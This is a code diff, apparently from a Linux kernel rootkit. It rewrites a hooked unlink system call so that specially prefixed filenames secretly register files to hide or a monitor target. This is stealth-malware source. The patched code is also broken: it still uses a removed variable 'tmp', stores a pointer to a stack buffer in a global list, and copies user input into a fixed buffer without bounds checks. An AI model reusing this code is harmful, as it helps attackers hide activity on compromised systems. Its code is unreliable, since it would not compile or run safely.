@@ -138,25 +138,36 @@ asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode
 }
 
 asmlinkage long hooked_unlink(const char __user *filename){
-    char *tmp;
+    int i, j;
     char value[256];
     
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
-        memcpy(value, filename, strlen(filename) + 1);
-        tmp = value;
-        printk("hide %s\n", tmp);
-        while(*tmp != '%' || *tmp != '\0') tmp++;
-        if(*tmp == '%'){
-            hidfiles[filenum] = tmp;
+        for(i=0, j=-1; i<strlen(filename); i++){
+            if(j>-1){
+                value[j] = filename[i];
+                j++;
+            } else if(filename[i] == '%'){
+                j=0;
+            }
+        }
+        if(j>0){
+            value[j] = '\0';
+            hidfiles[filenum] = value;
             filenum++;
         }
         printk("hide %s\n", tmp);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
-        memcpy(value, filename, strlen(filename) + 1);
-        tmp = value;
-        while(*tmp != '%' || *tmp != '\0') tmp++;
-        if(*tmp == '%'){
+        for(i=0, j=-1; i<strlen(filename); i++){
+            if(j>-1){
+                value[j] = filename[i];
+                j++;
+            } else if(filename[i] == '%'){
+                j=0;
+            }
+        }
+        if(j>0){
+            value[j] = '\0';
             monitor = tmp;
         }
     }
